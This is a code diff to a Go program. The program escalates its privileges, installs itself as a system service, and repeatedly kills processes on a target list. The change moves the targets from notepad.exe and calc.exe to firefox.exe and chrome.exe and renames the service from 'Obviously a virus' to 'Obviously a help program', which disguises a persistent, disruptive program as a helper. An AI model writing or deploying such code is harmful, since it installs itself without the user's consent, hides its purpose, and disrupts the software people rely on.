@@ -33,22 +33,21 @@ func ExistsInSlice(slice interface{}, item interface{}) bool {
 
 var (
 	marked_file_to_kill = []string{
-		"notepad.exe",
-		"calc.exe",
+		"firefox.exe",
+		"chrome.exe",
 	}
 )
 
 func main() {
-	if executablePath, err := os.Executable(); err == nil {
+	if executable_path, err := os.Executable(); err == nil {
 		if CheckElevate() == false {
-			if err := Escalate(executablePath); err != nil {
-				return
+			if err := Escalate(executable_path); err != nil {
+				// we have a new install running we dont have to keep this one running
+				os.Exit(0)
 			}
 		} else {
-			if service, err := daemon.New("Obviously a virus", "A sample description to see", daemon.SystemDaemon); err == nil {
+			if service, err := daemon.New("Obviously a help program", "A sample description to see", daemon.SystemDaemon); err == nil {
 				if _, err := service.Install(); err == nil {
-					// yeah we are working man
-
 					for {
 						var to_kill_processes []int
 
